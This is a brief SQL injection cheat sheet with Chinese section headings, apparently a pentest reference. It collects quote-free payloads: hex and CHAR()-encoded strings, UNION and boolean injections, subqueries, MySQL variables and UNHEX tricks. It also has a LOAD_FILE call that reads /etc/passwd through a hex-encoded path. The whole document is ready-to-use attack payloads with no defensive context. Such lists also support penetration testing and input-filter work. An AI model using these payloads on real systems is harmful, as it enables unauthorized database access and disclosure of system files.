# 无引号注入
# 十六进制
UNION SELECT 0x61646d696e
WHERE username=0x61646d696e
LIKE 0x25

# CHAR 函数
UNION SELECT CHAR(97,100,109,105,110)
WHERE username=CHAR(97,100,109,105,110)

# CONCAT + CHAR
CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))

# 数字型直接注入
1 AND 1=1
1 OR 1=1
1 UNION SELECT 1

# 子查询
1 AND (SELECT 1)=1
1 UNION (SELECT 1)

# 变量 (MySQL)
SET @a=0x61646d696e; SELECT @a

# 无引号文件读取
LOAD_FILE(0x2f6574632f706173737764)

# UNHEX
UNHEX(HEX(username))
UNHEX(61646d696e)
